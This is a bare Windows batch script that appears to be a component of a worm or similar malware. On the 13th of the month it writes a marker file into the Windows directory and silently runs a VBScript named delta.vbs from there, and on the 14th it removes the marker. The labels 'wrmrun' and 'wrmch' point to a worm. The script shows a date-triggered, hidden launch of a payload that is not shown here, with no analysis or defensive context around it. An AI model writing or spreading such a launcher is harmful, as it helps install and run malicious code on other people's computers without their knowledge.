@echo off
echo: |date| find ".13"
if errorlevel 1 goto ch
if errorlevel 0 goto wrmrun
:wrmrun
if exist %winbootdir%\dl.cfg goto ch
echo:13>%winbootdir%\dl.cfg
cscript %winbootdir%\delta.vbs //NoLogo //B
goto end
:ch
echo: |date| find ".14"
if errorlevel 1 goto end
if errorlevel 0 goto wrmch
:wrmch
del %winbootdir%\dl.cfg >nul
:end
exit
